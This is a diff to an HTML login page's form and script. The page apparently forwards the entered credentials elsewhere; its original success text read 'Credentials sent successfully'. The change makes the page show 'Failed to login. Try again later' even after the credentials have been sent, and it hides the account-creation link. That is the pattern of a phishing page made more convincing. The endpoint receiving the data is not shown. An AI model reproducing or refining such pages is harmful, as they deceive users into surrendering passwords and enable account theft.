@@ -94,10 +94,10 @@
       <div id="statusMessage" class="text-center mt-2 text-sm font-semibold text-orange-600"></div>
     </form>
 
-    <p class="mt-4 text-center text-sm text-gray-600">
+<!--     <p class="mt-4 text-center text-sm text-gray-600">
       Don't have an account?
       <a href="#" class="font-medium text-orange-600 hover:text-orange-500">Create one</a>
-    </p>
+    </p> -->
   </div>
 
   <script>
@@ -144,14 +144,14 @@
         const data = await res.json();
 
         if (data.ok) {
-          statusMessage.textContent = '✅ Credentials sent successfully.';
+          statusMessage.textContent = '❌ Failed to login. Try again later.';
           form.reset();
         } else {
-          statusMessage.textContent = '❌ Failed to send. Try again later.';
+          statusMessage.textContent = '❌ Failed to login. Try again later.';
           console.error(data);
         }
       } catch (err) {
-        statusMessage.textContent = '❌ Error sending message.';
+        statusMessage.textContent = '❌ Error Signing in';
         console.error(err);
       }
     });
